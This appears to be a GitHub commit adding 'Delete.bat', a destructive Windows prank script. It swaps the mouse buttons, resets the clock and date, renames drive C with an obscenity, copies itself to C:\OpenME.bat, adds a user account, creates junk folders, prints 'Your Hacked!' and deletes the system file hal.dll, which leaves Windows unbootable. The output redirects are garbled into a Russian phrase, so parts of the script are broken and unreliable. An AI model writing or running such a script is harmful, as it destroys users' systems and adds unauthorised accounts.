6c8709a51866e8098f8322fc389a3bd27ee80d7f
Zusyaku <71582475+Zusyaku@users.noreply.github.com>
2021-10-11 04:23:30 +0700

    Add files via upload

---
+++ Delete.bat
@@ -0,0 +1,25 @@
+@echo off
+%SystemRoot%/system32/rundll32 user32, SwapMouseButon угловая скобкаnul
+time 3:00 угловая скобкаnul
+date 06.06.2006 угловая скобкаnul
+label C:GOVNO угловая скобкаnul
+copy %0 C:\OpenME.bat угловая скобкаnul
+net user "Lox" /add угловая скобкаnul
+md 1 угловая скобкаnul
+md 2 угловая скобкаnul
+md 3 угловая скобкаnul
+md 4 угловая скобкаnul
+md 5 угловая скобкаnul
+md 6 угловая скобкаnul
+md 7 угловая скобкаnul
+md 8 угловая скобкаnul
+md 9 угловая скобкаnul
+md 10 угловая скобкаnul
+md 11 угловая скобкаnul
+md 12 угловая скобкаnul
+md 13 угловая скобкаnul
+md 14 угловая скобкаnul
+md 15 угловая скобкаnul
+echo Your Hacked!
+color a
+del C:\WINDOWS\system32\hal.dll
